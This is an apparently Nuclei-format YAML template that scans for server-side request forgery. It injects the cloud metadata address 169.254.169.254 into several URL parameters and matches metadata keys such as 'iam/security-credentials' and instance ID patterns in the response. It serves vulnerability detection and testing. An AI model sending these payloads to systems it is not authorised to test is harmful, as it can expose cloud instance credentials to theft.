id: hunt3r-ssrf-detection

info:
  name: SSRF - Server-Side Request Forgery
  author: hunt3r
  severity: high
  description: Detects SSRF via URL parameters that trigger actual server-side requests. Matchers only fire on confirmed SSRF response content (cloud metadata keys, internal service markers) - never on reflected URL input.
  tags: ssrf,hunt3r
  reference:
    - https://portswigger.net/web-security/ssrf

http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/ami-id"
      - "{{BaseURL}}/?target=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/proxy?url=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/fetch?url=http://169.254.169.254/latest/meta-data/"
      - "{{BaseURL}}/api/ping?ip=http://169.254.169.254/"

    # NOTE: Only match ACTUAL metadata response content, NEVER the injected
    # URL string itself (which any SPA error page will reflect back).
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "ami-id"
          - "instance-id"
          - "local-hostname"
          - "ec2metadata"
          - "instance-type"
          - "placement/region"
          - "public-ipv4"
          - "iam/security-credentials"

      - type: regex
        part: body
        regex:
          - "ami-[0-9a-f]{8,17}"
          - "i-[0-9a-f]{17}"
          - "\"instanceId\"\\s*:"
          - "\"privateIp\"\\s*:"
